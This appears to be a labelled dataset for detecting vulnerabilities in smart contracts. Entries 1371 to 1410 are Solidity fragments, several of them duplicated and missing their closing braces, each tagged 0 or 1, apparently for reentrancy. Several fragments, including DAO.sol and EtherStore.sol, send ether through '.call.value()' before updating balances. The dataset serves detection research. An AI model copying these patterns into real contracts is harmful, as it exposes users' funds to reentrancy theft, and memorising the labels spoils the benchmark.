FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
0
---------------------------------
1371 40299.sol
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
function redeem(uint tokens) {
if (!feeAccount.call.value(safeMul(tokens,fee)/(1 ether))()) throw;
if (!resolved) {
yesToken.destroy(msg.sender, tokens);
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, tokens);
} else if (resolved) {
if (outcome==0) {
noToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, 0, tokens);
} else if (outcome==1) {
yesToken.destroy(msg.sender, tokens);
if (!msg.sender.call.value(safeMul(tokens,(1 ether)-fee)/(1 ether))()) throw;
Redeem(msg.sender, tokens, tokens, 0);
0
---------------------------------
1372 40357.sol
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
1
---------------------------------
1373 40500.sol
function payOut(address _recipient, uint _amount) returns (bool) {
if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))
throw;
if (_recipient.call.value(_amount)()) {
PayOut(_recipient, _amount);
return true;
} else {
return false;
contract TokenInterface {
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
uint256 public totalSupply;
function createTokenProxy(address _tokenHolder) returns (bool success) {
if (now < closingTime && msg.value > 0
&& (privateCreation == 0 || privateCreation == msg.sender)) {
uint token = (msg.value * 20) / divisor();
extraBalance.call.value(msg.value - token)();
balances[_tokenHolder] += token;
totalSupply += token;
weiGiven[_tokenHolder] += msg.value;
CreatedToken(_tokenHolder, token);
if (totalSupply >= minTokensToCreate && !isFueled) {
isFueled = true;
FuelingToDate(totalSupply);
return true;
throw;
function refund() noEther {
if (now > closingTime && !isFueled) {
if (extraBalance.balance >= extraBalance.accumulatedInput())
extraBalance.payOut(address(this), extraBalance.accumulatedInput());
if (msg.sender.call.value(weiGiven[msg.sender])()) {
Refund(msg.sender, weiGiven[msg.sender]);
totalSupply -= balances[msg.sender];
balances[msg.sender] = 0;
weiGiven[msg.sender] = 0;
function executeProposal(uint _proposalID, bytes _transactionData) noEther returns (bool _success) {
Proposal p = proposals[_proposalID];
uint waitPeriod = p.newCurator ? splitExecutionPeriod : executeProposalPeriod;
if (p.open && now > p.votingDeadline + waitPeriod) {
closeProposal(_proposalID);
return;
if (now < p.votingDeadline || !p.open || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {
throw;
if (!isRecipientAllowed(p.recipient)) {
closeProposal(_proposalID);
p.creator.send(p.proposalDeposit);
return;
bool proposalCheck = true;
if (p.amount > actualBalance())
proposalCheck = false;
uint quorum = p.yea + p.nay;
if (_transactionData.length >= 4 && _transactionData[0] == 0x68
&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff
&& _transactionData[3] == 0x1e
&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {
proposalCheck = false;
if (quorum >= minQuorum(p.amount)) {
if (!p.creator.send(p.proposalDeposit))
throw;
lastTimeMinQuorumMet = now;
if (quorum > totalSupply / 5)
minQuorumDivisor = 5;
if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {
if (!p.recipient.call.value(p.amount)(_transactionData))
throw;
p.proposalPassed = true;
_success = true;
if (p.recipient != address(this) && p.recipient != address(rewardAccount)
&& p.recipient != address(DAOrewardAccount)
&& p.recipient != address(extraBalance)
&& p.recipient != address(curator)) {
rewardToken[address(this)] += p.amount;
totalRewardToken += p.amount;
closeProposal(_proposalID);
ProposalTallied(_proposalID, _success, quorum);
function newContract(address _newContract){
if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;
if (!_newContract.call.value(address(this).balance)()) {
throw;
rewardToken[_newContract] += rewardToken[address(this)];
rewardToken[address(this)] = 0;
DAOpaidOut[_newContract] += DAOpaidOut[address(this)];
DAOpaidOut[address(this)] = 0;
0
---------------------------------
1374 DAO.sol
function payOut(address _recipient, uint _amount) returns (bool) {
if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))
throw;
if (_recipient.call.value(_amount)()) {
PayOut(_recipient, _amount);
return true;
} else {
return false;
contract TokenCreationInterface {
uint public closingTime;
uint public minTokensToCreate;
bool public isFueled;
address public privateCreation;
ManagedAccount public extraBalance;
mapping (address => uint256) weiGiven;
function createTokenProxy(address _tokenHolder) returns (bool success) {
if (now < closingTime && msg.value > 0 && (privateCreation == 0 || privateCreation == msg.sender)) {
uint token = (msg.value * 20) / divisor();
extraBalance.call.value(msg.value - token)();
balances[_tokenHolder] += token;
totalSupply += token;
weiGiven[_tokenHolder] += msg.value;
CreatedToken(_tokenHolder, token);
if (totalSupply >= minTokensToCreate && !isFueled) {
isFueled = true;
FuelingToDate(totalSupply);
return true;
throw;
function refund() noEther {
if (now > closingTime && !isFueled) {
if (extraBalance.balance >= extraBalance.accumulatedInput())
extraBalance.payOut(address(this), extraBalance.accumulatedInput());
if (msg.sender.call.value(weiGiven[msg.sender])()) {
Refund(msg.sender, weiGiven[msg.sender]);
totalSupply -= balances[msg.sender];
balances[msg.sender] = 0;
weiGiven[msg.sender] = 0;
function executeProposal(uint _proposalID, bytes _transactionData) noEther returns (bool _success) {
Proposal p = proposals[_proposalID];
uint waitPeriod = p.newCurator ? splitExecutionPeriod : executeProposalPeriod;
if (p.open && now > p.votingDeadline + waitPeriod) {
closeProposal(_proposalID);
return;
if (now < p.votingDeadline || !p.open || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {
throw;
if (!isRecipientAllowed(p.recipient)) {
closeProposal(_proposalID);
p.creator.send(p.proposalDeposit);
return;
bool proposalCheck = true;
if (p.amount > actualBalance())
proposalCheck = false;
uint quorum = p.yea + p.nay;
if (_transactionData.length >= 4 && _transactionData[0] == 0x68
&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff
&& _transactionData[3] == 0x1e
&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {
proposalCheck = false;
if (quorum >= minQuorum(p.amount)) {
if (!p.creator.send(p.proposalDeposit))
throw;
lastTimeMinQuorumMet = now;
if (quorum > totalSupply / 5)
minQuorumDivisor = 5;
if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {
if (!p.recipient.call.value(p.amount)(_transactionData))
throw;
p.proposalPassed = true;
_success = true;
if (p.recipient != address(this) && p.recipient != address(rewardAccount)
&& p.recipient != address(DAOrewardAccount)
&& p.recipient != address(extraBalance)
&& p.recipient != address(curator)) {
rewardToken[address(this)] += p.amount;
totalRewardToken += p.amount;
closeProposal(_proposalID);
ProposalTallied(_proposalID, _success, quorum);
function newContract(address _newContract){
if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;
if (!_newContract.call.value(address(this).balance)()) {
throw;
rewardToken[_newContract] += rewardToken[address(this)];
rewardToken[address(this)] = 0;
DAOpaidOut[_newContract] += DAOpaidOut[address(this)];
DAOpaidOut[address(this)] = 0;
1
---------------------------------

1375 14284.sol
14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1376 40366.sol
40366.sol
function execute(address _to, uint _value, bytes _data) {
if (!isRightBranch) throw;
if (msg.sender != owner) throw;
if (!_to.call.value (_value)(_data)) throw;
contract BranchSender {
bool public isRightBranch;
0
---------------------------------
1377 2189.sol
2189.sol
function transferAndCall( address _to,  uint256 _value,   bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
1378 27263.sol
27263.sol
function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable{
if(msg.sender != address(this))throw;
if(target.call.value(amount)()) {
CashMove(amount, logMsg, target, currentOwner);
function Divest(uint amount)  public  {
if ( investors[msg.sender] > 0 && amount > 0)  {
this.loggedTransfer(amount, "", msg.sender, owner);
investors[msg.sender] -= amount;
function withdraw() public {
if(msg.sender==owner) {
this.loggedTransfer(this.balance, "", msg.sender, owner);
1
---------------------------------
1379 22247.sol
22247.sol
function Collect(uint _am) public payable {
if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) {
if(msg.sender.call.value(_am)()) {
Accounts[msg.sender]-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function()
public
payable
Put(msg.sender);
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1380 37676.sol
37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
1381 33410.sol
33410.sol
function executeTransaction(uint transactionId)  internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId)  public ownerExists(msg.sender) transactionExists(transactionId)  notConfirmed(transactionId, msg.sender){
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1382 4472.sol
4472.sol
function () public payable {
address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)();
0
---------------------------------
1383 37474.sol
37474.sol
function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) {
require(msg.sender==owner);
require(_to.call.value(_value)(_data));
return 0;
0
---------------------------------
1384 33835.sol
33835.sol
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data);
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
0
---------------------------------
1385 1044.sol
1044.sol
function donateToWhale(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Donate(amount, whale, msg.sender);
function loseWager(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Lose(amount, msg.sender);
1
---------------------------------
1386 17573.sol
17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
1387 17215.sol
17215.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) {
require(compatible223ex);
require(isUnlockedBoth(_to));
require(balances[msg.sender] >= _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
if (isContract(_to)) {
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
0
---------------------------------
1388 16057.sol
16057.sol
function callFirstTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
firstTarget.call.value(msg.value)();
function callSecondTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
secondTarget.call.value(msg.value)();
function winPrize() public payable onlyOwner {
owner.call.value(1 wei)();
0
---------------------------------
1389 19402.sol
19402.sol
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock) throw;
uint tokens = safeMul(value, price());
if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw;
balances[recipient] = safeAdd(balances[recipient], tokens);
crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens);
totalSupply = safeAdd(totalSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
function price() constant returns(uint) {
if (block.number<startBlock || block.number > endBlock) return 0;
else  return crowdSalePrice;
function() public payable {
if(msg.value == 0) {
sendCandy(msg.sender);
}  else {
buyToken(msg.sender, msg.value);
0
---------------------------------
1390 3054.sol
3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
1391 29517.sol
29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
1392 30046.sol
30046.sol
function executeTransaction() public onlyActiveUsersAllowed()  transactionMustBePending() {
Transaction storage transaction = transactions[transactions.length - 1];
require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time);
transaction.is_executed = true;
transaction.time_finalized = now;
transaction.finalized_by = msg.sender;
transaction.execution_successful = transaction.destination.call.value(
transaction.value)(transaction.data);
1
---------------------------------
1393 27248.sol
27248.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public {
require(sigR.length == threshold);
require(sigR.length == sigS.length && sigR.length == sigV.length);
bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce);
address lastAdd = address(0);
for (uint i = 0; i < threshold; i++) {
address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]);
require(recovered > lastAdd && isOwner[recovered]);
lastAdd = recovered;
nonce = nonce + 1;
require(destination.call.value(value)(data));
0
---------------------------------
1394 EtherStore.sol
EtherStore.sol
function withdrawFunds (uint256 _weiToWithdraw) public {
require(balances[msg.sender] >= _weiToWithdraw);
require(_weiToWithdraw <= withdrawalLimit);
require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
lastWithdrawTime[msg.sender] = now;
1
---------------------------------
1395 40589.sol
40589.sol
function sendRobust(address to, uint value) internal {
if (!to.send(value)) {
if (!to.call.value(value)()) throw;
function _fillOrder(address _from, uint numTokens) internal returns (bool) {
if (numTokens == 0) throw;
if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;
if (!token.transferFrom(_from, owner, numTokens)) return false;
sendRobust(_from, numTokens * weiPerToken / decimalPlaces);
OrderFilled(_from, numTokens);
return true;
0
---------------------------------
1396 11705.sol
11705.sol
function commonWithdraw(address token, uint value) internal {
require (tokens[token][msg.sender] >= value);
tokens[token][msg.sender] -= value;
totalDeposited[token] -= value;
require((token != 0)?
ERC20(token).transfer(msg.sender, value):
msg.sender.call.value(value)()
);
emit Withdraw(
token,
msg.sender,
value,
tokens[token][msg.sender]);
function withdraw(uint amount) public {
commonWithdraw(0, amount);
function withdrawToken(address token, uint amount) public {
commonWithdraw(token, amount);
0
---------------------------------
1397 37891.sol
37891.sol
function claim() {
uint balance = balances[msg.sender];
require(balance > 0);
balances[msg.sender] = 0;
bool claimed = msg.sender.call.value(balance)();
require(claimed);
0
---------------------------------
1398 23166.sol
23166.sol
function buy(address recipient) payable public duringCrowdSale  {
require(!halted);
require(msg.value >= 0.01 ether);
uint256 tokens = msg.value.mul(35e4);
require(tokens > 0);
require(saleTokenSupply.add(tokens)<=coinAllocation );
balances[recipient] = balances[recipient].add(tokens);
totalSupply_ = totalSupply_.add(tokens);
saleTokenSupply = saleTokenSupply.add(tokens);
salesVolume = salesVolume.add(msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(msg.sender, recipient, msg.value, tokens);
function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public {
admin = msg.sender;
founder = founderWallet;
startDatetime = startDatetimeInSeconds;
endDatetime = startDatetime + 16 * 1 days;
function() public payable {
buy(msg.sender);
0
---------------------------------
1399 40416.sol
40416.sol
function withdraw(uint amount) {
if (msg.value>0) throw;
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] -= amount;
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1400 37329.sol
37329.sol
function buyICO() onlyExecutorOrOwner {
if (getBlockNumber() < icoStartBlock) return;
if (this.balance == 0) return;
uint256 purchaseAmount = Math.min256(this.balance, purchaseCap);
assert(crowdSale.call.value(purchaseAmount)());
ICOPurchased(purchaseAmount);
0
---------------------------------
1401 13076.sol
13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public payable returns (bool)  {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
_;
1
---------------------------------
1402 39890.sol
39890.sol
function authorizePayment(uint _idMilestone) internal {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw;
milestone.status = MilestoneStatus.AuthorizedForPayment;
if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw;
ProposalStatusChanged(_idMilestone, milestone.status);
function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  throw;
if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw;
authorizePayment(_idMilestone);
function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
0
---------------------------------
1403 35661.sol
35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
1404 35649.sol
35649.sol
function playerWithdrawPendingTransactions() public  payoutsAreActive   returns (bool)  {
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
1405 39932.sol
39932.sol
function process(bytes32 _destination) payable returns (bool) {
if (msg.value < 100) throw;
var tax = msg.value * taxPerc / 100;
var refill = bytes4(sha3("refill(bytes32)"));
if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw;
return true;
contract Invoice is Mortal {
address   public signer;
uint      public closeBlock;
Comission public comission;
string    public description;
bytes32   public beneficiary;
uint      public value;
0
---------------------------------
1406 31759.sol
31759.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination,  uint value, bytes data)  external {
bytes32 txHash = keccak256(byte(0x19),  byte(0), this, nonce++, destination, value, data  );
verifySignatures( sigV,sigR,sigS,txHash);
require(destination.call.value(value)(data));
0
---------------------------------
1407 22902.sol
22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1408 30337.sol
30337.sol
function withdrawPayments()  external   returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
1409 2013.sol
2013.sol
function executeTransaction(address destination, uint value, bytes data) public onlyOwner{
if (destination.call.value(value)(data))
emit Execution(destination,value,data);
else
emit ExecutionFailure(destination,value,data);
library SafeMath {
0
---------------------------------
1410 16643.sol
16643.sol
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
